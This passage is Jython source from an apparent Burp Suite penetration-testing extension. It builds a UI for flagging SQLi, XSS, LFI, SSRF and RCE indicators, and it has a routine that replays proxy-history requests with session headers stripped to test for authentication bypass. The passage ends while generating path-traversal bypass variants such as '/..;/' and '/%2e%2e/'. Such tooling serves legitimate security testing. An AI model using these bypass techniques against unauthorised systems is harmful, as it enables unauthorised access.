        self._cbBambdasSearchinURL.setToolTipText("Search for keywords in URLs.")
        self._cbBambdasSearchinReq = JCheckBox('in Requests', False, itemStateChanged=self._cbBambdasSearchinReqFunc)
        self._cbBambdasSearchinReq.setToolTipText("Search for keywords in requests.")
        self._cbBambdasSearchinRes = JCheckBox('in Responses', False, itemStateChanged=self._cbBambdasSearchinResFunc)
        self._cbBambdasSearchinRes.setToolTipText("Search for keywords in responses.")

        self._lblBambdasDisplayDays = JLabel("Display window (days)")
        self._cbBambdasDisplayDays = JComboBox(('1 Day', '2 Days', '3 Days', '7 Days', '14 Days', '30 Days', '365 Days'))
        self._lblBambdasDisplayDays.setToolTipText("How many past days of data to display.")
        self._cbBambdasDisplayDays.setToolTipText("How many past days of data to display.")
        self._lblBambdasProcessDays = JLabel("Processing window (days)")
        self._cbBambdasProcessDays = JComboBox(('1 Day', '2 Days', '3 Days', '7 Days', '14 Days', '30 Days', '365 Days'))
        self._lblBambdasProcessDays.setToolTipText("How many past days of data to process.")
        self._cbBambdasProcessDays.setToolTipText("How many past days of data to process.")

        self._cbBambdasHTTPMethods = JCheckBox('HTTP methods to ignore.', True, itemStateChanged=self._cbBambdasHTTPMethodsFunc)
        self._txtBambdasHTTPMethods = JTextField("", 100)
        self._txtBambdasHTTPMethods.setToolTipText("Enter HTTP methods to exclude (comma-separated).")
        self._cbBambdasHTTPMethods.setToolTipText("List HTTP methods to exclude from processing (e.g., HEAD, OPTIONS).")

        self._cbBambdasValuable = JCheckBox('Valuable keywords', False, itemStateChanged=self._cbBambdasValuableFunc)
        self._txtBambdasValuable = JTextField("", 100)
        self._txtBambdasValuable.setToolTipText("Keywords that mark as important (comma-separated).")
        self._cbBambdasValuable.setToolTipText("Flag items containing high-value keywords.")
        
        self._cbBambdasFilesDownloadable = JCheckBox('Downloadable file extensions', False, itemStateChanged=self._cbBambdasFilesDownFunc)
        self._txtBambdasFilesDownloadable = JTextField("", 100)
        self._txtBambdasFilesDownloadable.setToolTipText("Mark items with these extensions as suspicious, potentially downloadable (comma-separated).")
        self._cbBambdasFilesDownloadable.setToolTipText("Flag responses containing files suspected to be downloadable")

        self._cbBambdasSQLi = JCheckBox('SQLi-suspect identifiers', False, itemStateChanged=self._cbBambdasSQLiFunc)
        self._txtBambdasSQLiKeywords = JTextField("", 100)
        self._txtBambdasSQLiKeywords.setToolTipText("Keywords/parameter names that may indicate SQL injection (comma-separated).")
        self._cbBambdasSQLi.setToolTipText("Flag items containing potential SQLi indicators.")
        
        self._cbBambdasXSS = JCheckBox('XXS-suspect identifiers', False, itemStateChanged=self._cbBambdasXSSFunc)
        self._txtBambdasXSSKeywords = JTextField("", 100)
        self._txtBambdasXSSKeywords.setToolTipText("Keywords/parameter names that may indicate XSS injection (comma-separated).")
        self._cbBambdasXSS.setToolTipText("Flag items containing potential XSS indicators.")
        
        self._cbBambdasLFI = JCheckBox('LFI-suspect identifiers', False, itemStateChanged=self._cbBambdasLFIFunc)
        self._txtBambdasLFIKeywords = JTextField("", 100)
        self._txtBambdasLFIKeywords.setToolTipText("Keywords/parameter names that may indicate LFI injection (comma-separated).")
        self._cbBambdasLFI.setToolTipText("Flag items containing potential LFI indicators.")
    
        self._cbBambdasSSRF = JCheckBox('SSRF-suspect identifiers', False, itemStateChanged=self._cbBambdasSSRFFunc)
        self._txtBambdasSSRFKeywords = JTextField("", 100)
        self._txtBambdasSSRFKeywords.setToolTipText("Keywords/parameter names that may indicate SSRF injection (comma-separated).")
        self._cbBambdasSSRF.setToolTipText("Flag items containing potential SSRF indicators.")
    
        self._cbBambdasORed = JCheckBox('Open Redirect-suspect identifiers', False, itemStateChanged=self._cbBambdasORedFunc)
        self._txtBambdasORedKeywords = JTextField("", 100)
        self._txtBambdasORedKeywords.setToolTipText("Keywords/parameter names that may indicate Open Redirect injection (comma-separated).")
        self._cbBambdasORed.setToolTipText("Flag items containing potential Open Redirect indicators.")
    
        self._cbBambdasRCE = JCheckBox('RCE-suspect identifiers', False, itemStateChanged=self._cbBambdasRCEFunc)
        self._txtBambdasRCEKeywords = JTextField("", 100)
        self._txtBambdasRCEKeywords.setToolTipText("Keywords/parameter names that may indicate RCE injection (comma-separated).")
        self._cbBambdasRCE.setToolTipText("Flag items containing potential RCE indicators.")
    
        self._cbBambdasVulnJS = JCheckBox('Vulnerable JS Functions', False, itemStateChanged=self._cbBambdasVulnJSFunc)
        self._txtBambdasVulnJSKeywords = JTextField("", 100)
        self._txtBambdasVulnJSKeywords.setToolTipText("Potentially risky JavaScript functions to look for (comma-separated).")
        self._cbBambdasVulnJS.setToolTipText("Flag responses containing potentially risky JavaScript functions.")
    
        self._cbBambdasExtIgnore = JCheckBox('File extensions to ignore', True, itemStateChanged=self._cbBambdasExtIgnoreFunc)
        self._txtBambdasExtIgnoreKeywords = JTextField("", 100)
        self._txtBambdasExtIgnoreKeywords.setToolTipText("File extensions to exclude from processing (comma-separated).")
        self._cbBambdasExtIgnore.setToolTipText("Exclude items with these file extensions.")

        __tabBambdasPanelTop_Left = JPanel()
        layout = GroupLayout(__tabBambdasPanelTop_Left)
        __tabBambdasPanelTop_Left.setLayout(layout)
        layout.setAutoCreateGaps(True)
        layout.setAutoCreateContainerGaps(True)
    
        layout.setHorizontalGroup(
            layout.createSequentialGroup()
                .addGroup(layout.createParallelGroup(GroupLayout.Alignment.LEADING)
                    .addComponent(self._btnBambdasRun)
                    .addComponent(self._lblBambdasforWhat)
                    .addComponent(self._lblBambdasScope)
                    .addComponent(self._cbBambdasExtIgnore)
                    .addComponent(self._lblBambdasColorScope)
                    .addComponent(self._lblBambdasColorScopeSecondary)
                    .addComponent(self._lblBambdasColorKeyWords)
                    .addComponent(self._lblBambdasDisplayDays)
                    .addComponent(self._lblBambdasProcessDays)
                    .addComponent(self._lblBambdasSearchScope)
                    .addComponent(self._cbBambdasHTTPMethods)
                    .addComponent(self._cbBambdasSearchHTMLComments)
                    .addComponent(self._cbBambdasFilesDownloadable)
                    .addComponent(self._cbBambdasVulnJS)
                    .addComponent(self._cbBambdasValuable)
                    .addComponent(self._cbBambdasSQLi)
                    .addComponent(self._cbBambdasXSS)
                    .addComponent(self._cbBambdasLFI)
                    .addComponent(self._cbBambdasSSRF)
                    .addComponent(self._cbBambdasORed)
                    .addComponent(self._cbBambdasRCE)
                    .addComponent(self._cbBambdasExtIgnore)
                    .addComponent(self._lblBambdasNotification1))
                .addGroup(layout.createParallelGroup(GroupLayout.Alignment.LEADING)
                    .addComponent(self._btnBambdasReset)
                    .addComponent(self._cbBambdasforWhat, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE)
                    .addComponent(self._cbBambdasScope)
                    .addComponent(self._txtBambdasExtIgnoreKeywords)
                    .addComponent(self._cbBambdasColorScope, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE)
                    .addComponent(self._cbBambdasColorScopeSecondary, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE)
                    .addComponent(self._cbBambdasColorKeyWords, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE)
                    .addComponent(self._cbBambdasDisplayDays, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE)
                    .addComponent(self._cbBambdasProcessDays, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE)
                    .addGroup(layout.createSequentialGroup()
                        .addComponent(self._cbBambdasSearchinURL)
                        .addGap(10)
                        .addComponent(self._cbBambdasSearchinReq)
                        .addGap(10)
                        .addComponent(self._cbBambdasSearchinRes))
                    .addComponent(self._txtBambdasHTTPMethods)
                    .addComponent(self._txtBambdasSearchHTMLCommnets)
                    .addComponent(self._txtBambdasFilesDownloadable)
                    .addComponent(self._txtBambdasVulnJSKeywords)
                    .addComponent(self._txtBambdasValuable)
                    .addComponent(self._txtBambdasSQLiKeywords)
                    .addComponent(self._txtBambdasXSSKeywords)
                    .addComponent(self._txtBambdasLFIKeywords)
                    .addComponent(self._txtBambdasSSRFKeywords)
                    .addComponent(self._txtBambdasORedKeywords)
                    .addComponent(self._txtBambdasRCEKeywords)
                    .addComponent(self._lblBambdasNotification2))
        )
    
        layout.setVerticalGroup(
            layout.createSequentialGroup()
                .addGroup(layout.createParallelGroup(GroupLayout.Alignment.BASELINE)
                    .addComponent(self._btnBambdasRun)
                    .addComponent(self._btnBambdasReset))
                .addGroup(layout.createParallelGroup(GroupLayout.Alignment.BASELINE)
                    .addComponent(self._lblBambdasforWhat)
                    .addComponent(self._cbBambdasforWhat))
                .addGroup(layout.createParallelGroup(GroupLayout.Alignment.BASELINE)
                    .addComponent(self._lblBambdasScope)
                    .addComponent(self._cbBambdasScope))
                .addGroup(layout.createParallelGroup(GroupLayout.Alignment.BASELINE)
                    .addComponent(self._cbBambdasExtIgnore)
                    .addComponent(self._txtBambdasExtIgnoreKeywords))
                .addGroup(layout.createParallelGroup(GroupLayout.Alignment.BASELINE)
                    .addComponent(self._lblBambdasColorScope)
                    .addComponent(self._cbBambdasColorScope))
                .addGroup(layout.createParallelGroup(GroupLayout.Alignment.BASELINE)
                    .addComponent(self._lblBambdasColorScopeSecondary)
                    .addComponent(self._cbBambdasColorScopeSecondary))
                .addGroup(layout.createParallelGroup(GroupLayout.Alignment.BASELINE)
                    .addComponent(self._lblBambdasColorKeyWords)
                    .addComponent(self._cbBambdasColorKeyWords))
                .addGroup(layout.createParallelGroup(GroupLayout.Alignment.BASELINE)
                    .addComponent(self._lblBambdasDisplayDays)
                    .addComponent(self._cbBambdasDisplayDays))
                .addGroup(layout.createParallelGroup(GroupLayout.Alignment.BASELINE)
                    .addComponent(self._lblBambdasProcessDays)
                    .addComponent(self._cbBambdasProcessDays))
                .addGroup(layout.createParallelGroup(GroupLayout.Alignment.BASELINE)
                    .addComponent(self._lblBambdasSearchScope)
                    .addComponent(self._cbBambdasSearchinURL)
                    .addComponent(self._cbBambdasSearchinReq)
                    .addComponent(self._cbBambdasSearchinRes))
                .addGroup(layout.createParallelGroup(GroupLayout.Alignment.BASELINE)
                    .addComponent(self._cbBambdasHTTPMethods)
                    .addComponent(self._txtBambdasHTTPMethods))
                .addGroup(layout.createParallelGroup(GroupLayout.Alignment.BASELINE)
                    .addComponent(self._cbBambdasSearchHTMLComments)
                    .addComponent(self._txtBambdasSearchHTMLCommnets))
                .addGroup(layout.createParallelGroup(GroupLayout.Alignment.BASELINE)
                    .addComponent(self._cbBambdasFilesDownloadable)
                    .addComponent(self._txtBambdasFilesDownloadable))
                .addGroup(layout.createParallelGroup(GroupLayout.Alignment.BASELINE)
                    .addComponent(self._cbBambdasVulnJS)
                    .addComponent(self._txtBambdasVulnJSKeywords))
                .addGroup(layout.createParallelGroup(GroupLayout.Alignment.BASELINE)
                    .addComponent(self._cbBambdasValuable)
                    .addComponent(self._txtBambdasValuable))
                .addGroup(layout.createParallelGroup(GroupLayout.Alignment.BASELINE)
                    .addComponent(self._cbBambdasSQLi)
                    .addComponent(self._txtBambdasSQLiKeywords))
                .addGroup(layout.createParallelGroup(GroupLayout.Alignment.BASELINE)
                    .addComponent(self._cbBambdasXSS)
                    .addComponent(self._txtBambdasXSSKeywords))
                .addGroup(layout.createParallelGroup(GroupLayout.Alignment.BASELINE)
                    .addComponent(self._cbBambdasLFI)
                    .addComponent(self._txtBambdasLFIKeywords))
                .addGroup(layout.createParallelGroup(GroupLayout.Alignment.BASELINE)
                    .addComponent(self._cbBambdasSSRF)
                    .addComponent(self._txtBambdasSSRFKeywords))
                .addGroup(layout.createParallelGroup(GroupLayout.Alignment.BASELINE)
                    .addComponent(self._cbBambdasORed)
                    .addComponent(self._txtBambdasORedKeywords))
                .addGroup(layout.createParallelGroup(GroupLayout.Alignment.BASELINE)
                    .addComponent(self._cbBambdasRCE)
                    .addComponent(self._txtBambdasRCEKeywords))
                .addGroup(layout.createParallelGroup(GroupLayout.Alignment.BASELINE)
                    .addComponent(self._lblBambdasNotification1)
                    .addComponent(self._lblBambdasNotification2))
        )

        self._tbBambdasScopeURLs = JTextPane()
        self._tbBambdasScopeURLs.setToolTipText("Define test scope: one URL per line. Leave blank to include everything, and * acts like a regex wildcard.")
        self._txBambdasScopeURLs = "Please provide all URLs in the testing scope. * works like a placeholder for anything. Examples:\n\t- /\n\t+ The root path includes everything\n\t- /TargetPath\n\t+ It includes only the exact path you provide:\n\t\t+ /TargetPath?id=1\n\t- /TargetPath/*\n\t+ It includes all paths starting with the one you provide:\n\t\t+ /TargetPath/a/b/c/?id=1"
        placeholderText1 = self._txBambdasScopeURLs
        self._tbBambdasScopeURLs.setText(placeholderText1)
        self._tbBambdasScopeURLs.setForeground(Color.GRAY)
        listener1 = MyFocusListener(self._tbBambdasScopeURLs, placeholderText1)
        self._tbBambdasScopeURLs.addFocusListener(listener1)

        self._lbBambdasScopeURLs = JLabel("Definition of testing scope", SwingConstants.LEFT)
        self._lbBambdasScopeURLs.setFont(self._lbBambdasScopeURLs.getFont().deriveFont(Font.BOLD))

        self._tbBambdasScopeDoneURLs = JTextPane()
        self._tbBambdasScopeDoneURLs.setToolTipText("Mark already-tested endpoints: one URL per line. Leave blank if none, and * acts like a regex wildcard.")
        self._txBambdasScopeDoneURLs = "Please provide URLs already tested. * works like a placeholder for anything. Examples:\n\t- /admin/*/users/*/class\n\t+ Asterisk stands for anything (ID, UUID, etc):\n\t\t+ /admin/12345/users/67890/class?view=page\n\t- /admin/*/users/*/class*\n\t+ Asterisk stands for anything (ID, UUID, or to match everything after the path):\n\t\t+ /admin/12345/users/67890/class/cat/view/?page=home"
        placeholderText2 = self._txBambdasScopeDoneURLs
        self._tbBambdasScopeDoneURLs.setText(placeholderText2)
        self._tbBambdasScopeDoneURLs.setForeground(Color.GRAY)
        listener2 = MyFocusListener(self._tbBambdasScopeDoneURLs, placeholderText2)
        self._tbBambdasScopeDoneURLs.addFocusListener(listener2)

        self._lbBambdasScopeDoneURLs = JLabel("Already Tested URLs", SwingConstants.LEFT)
        self._lbBambdasScopeDoneURLs.setFont(self._lbBambdasScopeDoneURLs.getFont().deriveFont(Font.BOLD))

        self._tbBambdasBlackListedURLs = JTextPane()
        self._tbBambdasBlackListedURLs.setToolTipText("Hide from the history: one URL per line. Leave blank to exclude nothing. Adding '/' will hide everything unless a criteria matches, and * acts like a regex wildcard.")
        self._txBambdasBlackListedURLs = "Please provide the URLs to be blacklisted, to hide from the HTTP call history. * works like a placeholder for anything. Examples:\n\t-/health-check/\n\t+ Excludes specifically this path:\n\t\t+ /health-check/?Level=Info\n\t-/health-check*\n\t+ Excludes specifically this path, and rest:\n\t\t+ /health-check/monitor/log/?Level=Info"
        placeholderText3 = self._txBambdasBlackListedURLs
        self._tbBambdasBlackListedURLs.setText(placeholderText3)
        self._tbBambdasBlackListedURLs.setForeground(Color.GRAY)
        listener3 = MyFocusListener(self._tbBambdasBlackListedURLs, placeholderText3)
        self._tbBambdasBlackListedURLs.addFocusListener(listener3)

        self._lbBambdasBlackListedURLs = JLabel("Black-Listed URLs", SwingConstants.LEFT)
        self._lbBambdasBlackListedURLs.setFont(self._lbBambdasBlackListedURLs.getFont().deriveFont(Font.BOLD))

        __tabBambdasPanelTop_Right = JPanel()
        __tabBambdasPanelTop_Right.setLayout(BoxLayout(__tabBambdasPanelTop_Right, BoxLayout.Y_AXIS))

        __tabBambdasPanelTop_Right.add(self._lbBambdasScopeURLs)
        scrollBambdasScopeURLs = JScrollPane(self._tbBambdasScopeURLs)
        scrollBambdasScopeURLs.setPreferredSize(Dimension(400, 100))
        __tabBambdasPanelTop_Right.add(scrollBambdasScopeURLs)

        __tabBambdasPanelTop_Right.add(self._lbBambdasScopeDoneURLs)
        scrollBambdasScopeDoneURLs = JScrollPane(self._tbBambdasScopeDoneURLs)
        scrollBambdasScopeDoneURLs.setPreferredSize(Dimension(400, 100))
        __tabBambdasPanelTop_Right.add(scrollBambdasScopeDoneURLs)

        __tabBambdasPanelTop_Right.add(self._lbBambdasBlackListedURLs)
        scrollBambdasBlackListedURLs = JScrollPane(self._tbBambdasBlackListedURLs)
        scrollBambdasBlackListedURLs.setPreferredSize(Dimension(400, 100))
        __tabBambdasPanelTop_Right.add(scrollBambdasBlackListedURLs)

        _tabBambdasPanelTop = JSplitPane(JSplitPane.HORIZONTAL_SPLIT)
 
        _tabBambdasPanelTop.setResizeWeight(0.5)
        _tabBambdasPanelTop.setLeftComponent(__tabBambdasPanelTop_Left)
        _tabBambdasPanelTop.setRightComponent(__tabBambdasPanelTop_Right)
        _tabBambdasPanelBottom = JPanel(BorderLayout())
        self._tbBambdasScript = JTextPane()
        self._tbBambdasScript.setContentType("text")
        self._tbBambdasScript.setToolTipText("The generated Bambdas script will appear here after you click Run.")
        self._tbBambdasScript.setEditable(True)
        self.updateBambdasScriptText("/* Bambdas Script will be in here automatically */")
        scroll_pane = JScrollPane(self._tbBambdasScript)

        # Add custom MouseWheelListener to slow down scrolling
        class SlowScrollMouseWheelListener(MouseWheelListener):
            def mouseWheelMoved(inner_self, e):
                scrollBar = scroll_pane.getVerticalScrollBar()
                amount = e.getUnitsToScroll() * 5  # Adjust for scroll speed
                scrollBar.setValue(scrollBar.getValue() + amount)
                e.consume()  # Prevent default fast scroll

        self._tbBambdasScript.addMouseWheelListener(SlowScrollMouseWheelListener())

        _tabBambdasPanelBottom.add(scroll_pane, BorderLayout.CENTER)
        self._tabBambdasPanel = JSplitPane(JSplitPane.VERTICAL_SPLIT)
        self._tabBambdasPanel.setResizeWeight(0.1)
        self._tabBambdasPanel.setBorder(EmptyBorder(10, 10, 10, 10))
        self._tabBambdasPanel.setTopComponent(_tabBambdasPanelTop)
        self._tabBambdasPanel.setBottomComponent(_tabBambdasPanelBottom)

        self.funcBambdasUIReset(self)
        return

    def listChange(self, ev):
        try:
            self._tbAuthenticationHeader.setText(self._helpers.bytesToString(self._helpers.buildHttpMessage(self.authenticationMatrix[self.tabAuthenticationJlist.getSelectedIndex()][1], self.authenticationMatrix[self.tabAuthenticationJlist.getSelectedIndex()][2])))
            self._tbAuthenticationHeader.setSelectionStart(0)
            self._tbAuthenticationHeader.setSelectionEnd(0)
        except:
            pass
        return

    def historyFetchHostname(self, ev):
        #load hostname from history
        t = Thread(target=self.historyFetchHostnameThread, args=[self])
        t.start()
        return
    def historyFetchHostnameThread(self, ev):
        self._cbAuthenticationHost.removeAllItems()
        _hostnames = []
        histories = self._callbacks.getProxyHistory()
        for history in histories:
            _hostname = str(self._helpers.analyzeRequest(history).getUrl().getHost())
            if _hostname not in _hostnames:
                _hostnames.append(_hostname)
                self._cbAuthenticationHost.addItem(_hostname)
        return

    def historyFetcher(self, ev):
        #read from history
        t = Thread(target=self.historyFetcherThread, args=[self])
        t.start()
        return
    
    def historyFetcherThread(self, ev):
        if self._cbAuthenticationHost.getSelectedIndex() < 0:
            self._lblAuthenticationNotification.text = "Please select a hostname from the history, or 'Reset' the screen to update the list."
            return
        
        self.url_filter = URLFilter()

        urlVerification = False
        ignoredURLs = 0
        self._btnAuthenticationFetchHistory.setEnabled(False)
        self._btnAuthenticationReset.setEnabled(False)
        self._cbAuthenticationHost.setEnabled(False)
        self._btnAuthenticationRun.setEnabled(False)
        self._cbAuthenticationEnableFilter.setEnabled(False)
        self._lblAuthenticationDaystoShow.setEnabled(False)
        self._cbAuthenticationDaystoShow.setEnabled(False)
        self._lblAuthenticationEnableURLGroup.setEnabled(False)
        self._cbAuthenticationEnableURLGroup.setEnabled(False)
        self._lblAuthenticationEnableFilter2.setEnabled(False)
        self.txAuthenticationEnableKeyWordURL.setEnabled(False)
        histories = self._callbacks.getProxyHistory()[::-1]
        self._lblAuthenticationNotification.text = "Please wait while porxy history records are beeing analyzed."
        for history in histories:
            
            if self._cbAuthenticationEnableFilter.isSelected() and self._cbAuthenticationDaystoShow.getSelectedIndex() != 3:

                if history.getResponse() is None:
                    continue
                _headerResponse = self._helpers.analyzeResponse(self._helpers.bytesToString(history.getResponse())).getHeaders()
                response_date = None
                for header in _headerResponse:
                    if header.startswith("Date:"):
                        response_date = SimpleDateFormat("EEE, dd MMM yyyy HH:mm:ss z", Locale.ENGLISH).parse(header.split("Date:")[1].strip())
                        break

                calendar = Calendar.getInstance()
                if response_date is None:
                    continue
                elif self._cbAuthenticationDaystoShow.getSelectedIndex() == 0:
                    calendar.add(Calendar.DATE, -1)
                    days_ago = calendar.getTime()
                    if response_date.before(days_ago):
                        continue
                elif self._cbAuthenticationDaystoShow.getSelectedIndex() == 1:
                    calendar.add(Calendar.DATE, -3)
                    days_ago = calendar.getTime()
                    if response_date.before(days_ago):
                        continue
                elif self._cbAuthenticationDaystoShow.getSelectedIndex() == 2:
                    calendar.add(Calendar.DATE, -7)
                    days_ago = calendar.getTime()
                    if response_date.before(days_ago):
                        continue

            if self._cbAuthenticationHost.getSelectedItem() == str(self._helpers.analyzeRequest(history).getUrl().getHost()):
                # 0 is url
                _url = str(self._helpers.analyzeRequest(history).getUrl())
                if _url.startswith("https"):
                    _url = _url.replace(":443/", "/")
                elif _url.startswith("http"):
                    _url = _url.replace(":80/", "/")

                _ext = os.path.splitext(urlparse.urlparse(_url).path)[1]
                if any(_url in sublist for sublist in self.authenticationMatrix) or not _url or any(re.findall(url_regex, _url, re.IGNORECASE)) or any(re.findall(ext_regex, _ext, re.IGNORECASE)):
                    continue

                if self._cbAuthenticationEnableFilter.isSelected() and self.txAuthenticationEnableKeyWordURL.getText().strip():
                    keywords = [kw.strip() for kw in self.txAuthenticationEnableKeyWordURL.getText().split(',')]
                    if not any(keyword in _url for keyword in keywords):
                        continue

                should_process = True
                if self._cbAuthenticationEnableFilter.isSelected() and self._cbAuthenticationEnableURLGroup.isSelected():
                    should_process = self.url_filter.should_process(_url)

                if should_process:
                    urlVerification = True
                    self.tableMatrixAuthentication_DM.addRow([_url])
                    # 1 is header
                    _header = self._helpers.analyzeRequest(history).getHeaders()
                    headerRemoves = []
                    for header in _header:
                        if any(re.findall(r'(cookie|token|auth|content-length)(.*:)', header, re.IGNORECASE)):
                            headerRemoves.append(header)
                    for header in headerRemoves:
                        _header.remove(header)

                    # 2 is body
                    _body = self._helpers.bytesToString(history.getRequest()[self._helpers.analyzeRequest(history).getBodyOffset():])
                
                    self._urlAddresses.addElement(_url)
                    self.authenticationMatrix.append([_url, _header, _body])
                else:
                    ignoredURLs += 1

        self._btnAuthenticationRun.setEnabled(True)
        self._btnAuthenticationFetchHistory.setEnabled(True)
        self._btnAuthenticationReset.setEnabled(True)
        self._cbAuthenticationHost.setEnabled(True)
        self._cbAuthenticationEnableFilter.setEnabled(True)
        self._lblAuthenticationDaystoShow.setEnabled(True)
        self._cbAuthenticationDaystoShow.setEnabled(True)
        self._lblAuthenticationEnableURLGroup.setEnabled(True)
        self._cbAuthenticationEnableURLGroup.setEnabled(True)
        self._lblAuthenticationEnableFilter2.setEnabled(True)
        self.txAuthenticationEnableKeyWordURL.setEnabled(True)

        if not urlVerification:
            self._lblAuthenticationNotification.text = "No matching criteria found, and no records were added. Please review target hostname and filters."
            return
        ignoredURLsTxt = ""
        if ignoredURLs > 0:
            ignoredURLsTxt = str(ignoredURLs) + " similar URLs were ignored."

        self._lblAuthenticationNotification.text = "'" + str(self._cbAuthenticationHost.getSelectedItem()) + "' and '" + str(len(self.authenticationMatrix)) + "' requests loaded (session identifiers removed and URLs with actions like delete, remove, kill, terminate, log-out skipped)." + ignoredURLsTxt + " Load more or click 'RUN' to proceed."

        self._cbAuthenticationHost.removeItemAt(self._cbAuthenticationHost.getSelectedIndex())
        self.tabAuthenticationJlist.setSelectedIndex(0)
        if self._cbAuthenticationHost.getItemCount() == 0:
            self._btnAuthenticationFetchHistory.setEnabled(False)
        return


    def resetAuthentication(self, ev):
        self.authenticationMatrix = []
        self._httpReqResAuthentication =[]
        self._httpReqResAuthenticationTipMessage =[]
        self.tableMatrixAuthentication = []
        self.tableMatrixAuthentication_DM = CustomDefaultTableModel(self.tableMatrixAuthentication, ('URLs', '1', '2', '3', '4', '5', '6', '7', '8', '9', '10'))
        self.tableMatrixAuthentication = JTable(self.tableMatrixAuthentication_DM)
        self.tableMatrixAuthentication_SP.getViewport().setView((self.tableMatrixAuthentication))
        self._requestViewerAuthentication.setMessage("", False)
        self._responseViewerAuthentication.setMessage("", False)
        self.progressBarAuthenticationPanel.setValue(0)
        self.tableMatrixAuthentication.getSelectionModel().addListSelectionListener(self._updateAuthenticationReqResView)
        self.tableMatrixAuthentication.getColumnModel().getSelectionModel().addListSelectionListener(self._updateAuthenticationReqResView)
        self._btnAuthenticationFetchHistory.setEnabled(True)
        self._btnAuthenticationRun.setEnabled(False)
        self.tabAuthenticationJlist.getModel().removeAllElements()
        self._tbAuthenticationHeader.setText("")
        self._tabAuthenticationPanel.setDividerLocation(0.3)
        self._tabAuthenticationSplitpane.setDividerLocation(0.7)
        self._tabAuthenticationSplitpaneHttp.setDividerLocation(0.5)
        self.currentText = "You can load http requests over right click or fetch from proxy history."
        self.historyFetchHostname(self)
        self.tableMatrixAuthentication.getColumnModel().getColumn(0).setPreferredWidth(400)
        self.txAuthenticationEnableKeyWordURL.setVisible(False)
        self.txAuthenticationEnableKeyWordURL.setText("")
        self._lblAuthenticationEnableFilter2.setVisible(False)
        self._lblAuthenticationDaystoShow.setVisible(False)
        self._cbAuthenticationDaystoShow.setVisible(False)
        self._cbAuthenticationDaystoShow.setSelectedIndex(2)
        self._lblAuthenticationEnableURLGroup.setVisible(False)
        self._cbAuthenticationEnableURLGroup.setVisible(False)
        self._cbAuthenticationEnableURLGroup.setSelected(True)
        self._cbAuthenticationEnableFilter.setSelected(False)
        self._lblAuthenticationNotification.text = self.currentText
        return
    
    def authenticationMatrixFunc(self, ev):
        # run authentication bypass
        t = Thread(target=self.authenticationMatrixThread, args=[self, self.authenticationMatrix])
        t.start()
        return
    
    def _updateAuthenticationReqResView(self, ev):
        try:
            _row = self.tableMatrixAuthentication.getSelectedRow()
            _column = self.tableMatrixAuthentication.getSelectedColumn()

            if _column == 0:
                self._requestViewerAuthentication.setMessage("", False)
                self._responseViewerAuthentication.setMessage("", False)
            else:
                self._requestViewerAuthentication.setMessage(self._httpReqResAuthentication[_row][_column].getRequest(), False)
                self._responseViewerAuthentication.setMessage(self._httpReqResAuthentication[_row][_column].getResponse(), False)
        except:
            self._requestViewerAuthentication.setMessage("", False)
            self._responseViewerAuthentication.setMessage("", False)


    def authenticationMatrixCalls(self, _url, _header, _body, _portNum, _row, _column, _progressBar):
        try:
            self._lblAuthenticationNotification.text = "Please hold on, the table fields are being populated, and '" + str(self.progressBarAuthenticationPanel.getValue() / 10000) + "%' has been completed so far."
            self.progressBarAuthenticationPanel.setValue(self.progressBarAuthenticationPanel.getValue() + _progressBar)
            _body = self._helpers.stringToBytes(_body)
            _request = self._helpers.buildHttpMessage(_header, _body)
            _httpService = self._helpers.buildHttpService(urlparse.urlparse(_url).hostname, _portNum, urlparse.urlparse(_url).scheme)
            _response = self._callbacks.makeHttpRequest(_httpService, _request)
            _msgBody = self._helpers.bytesToString(_response.getResponse()[self._helpers.analyzeResponse(self._helpers.bytesToString(_response.getResponse())).getBodyOffset():])
            _status = str(self._helpers.analyzeResponse(self._helpers.bytesToString(_response.getResponse())).getStatusCode())
            
            if (_column == 32 or _column == 33 or _column == 34) and _status == '200':
                header = list(_header)
                del header[3]
                del header[3]
                url = _url.split('/',3)[0] + "//" + _url.split('/',3)[2] + "/"
                request = self._helpers.buildHttpMessage(header, _body)
                httpService = self._helpers.buildHttpService(urlparse.urlparse(url).hostname, _portNum, urlparse.urlparse(url).scheme)
                response = self._callbacks.makeHttpRequest(httpService, request)
                status = str(self._helpers.analyzeResponse(self._helpers.bytesToString(response.getResponse())).getStatusCode())
                if status == '200':
                    _msgBody = self._helpers.bytesToString(_response.getResponse()[self._helpers.analyzeResponse(self._helpers.bytesToString(_response.getResponse())).getBodyOffset():])
                    msgBody = self._helpers.bytesToString(response.getResponse()[self._helpers.analyzeResponse(self._helpers.bytesToString(response.getResponse())).getBodyOffset():])
                    if msgBody == _msgBody:
                        _status = _status + "-"

            if not _msgBody:
                _status = _status + "(EmptyBody)"
            
            if not self.tableMatrixAuthentication_DM.getValueAt(_row, _column):
                self.tableMatrixAuthentication_DM.setValueAt(_status, _row, _column)
            
            return _response

        except:
            print str(sys.exc_info()[1])
            self._lblAuthenticationNotification.text = "An error has occurred, but still in progress!"
            self.tableMatrixAuthentication_DM.setValueAt("null", _row, _column)
            self.errorNumbers +=1
            return ""

    def columnNumber(self, _urlPathes):
        columnNum = 0
        self.cellNumbers = 0
        for _urlPath in _urlPathes:
            try:
                _columnNum = 0
                _urls = self.urlDuplicator(_urlPath)
                if len(_urls) == 1:
                    _columnNum = 45
                else:
                    _columnNum = 89
                
                _rowUrls = []
                _searchFor = '/'
                _rowUrls.append(_urlPath)


                # column6, example url: http://dvwa.local/company/users/admin?id=1
                #                       http://dvwa.local/company/../company/users/admin?id=1
                #                       http://dvwa.local/company/users/../users/admin?id=1
                #                       http://dvwa.local/company/users/admin/../admin?id=1
                _replaceWiths = ["/%2e%2e/", "/../", "/..././", "/..;/", "/..;", "..;"]
                for _replaceWith in _replaceWiths:
                    for _url in _urls:
                        if _url.count('/') != 3:
                            if urlparse.urlparse(_url).path.endswith('/'):
                                _paths = urlparse.urlparse(_url).path.split('/', urlparse.urlparse(_url).path.count('/'))[:-1]
                            else: 
                                _paths = urlparse.urlparse(_url).path.split('/', urlparse.urlparse(_url).path.count('/'))
